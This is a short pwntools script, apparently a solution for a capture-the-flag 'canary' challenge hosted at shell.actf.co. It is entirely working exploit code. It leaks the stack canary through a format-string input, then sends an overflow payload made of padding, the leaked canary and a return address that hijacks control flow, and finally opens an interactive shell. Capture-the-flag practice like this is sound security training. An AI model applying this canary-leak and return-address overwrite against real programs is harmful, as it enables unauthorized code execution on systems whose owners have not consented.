from pwn import *

# p = process(["./canary"])
p = remote("shell.actf.co", 20701)
# p = gdb.debug(["./canary"])

p.sendline("%17$llx")
p.recvuntil("you, ")
canary = int(p.recvline()[:-2], 16)
log.info("canary: " + hex(canary))
p.sendline("AAAAAAAA" * 7 + p64(canary) + p64(0xdeadbeef) + p64(0x400787))
p.interactive()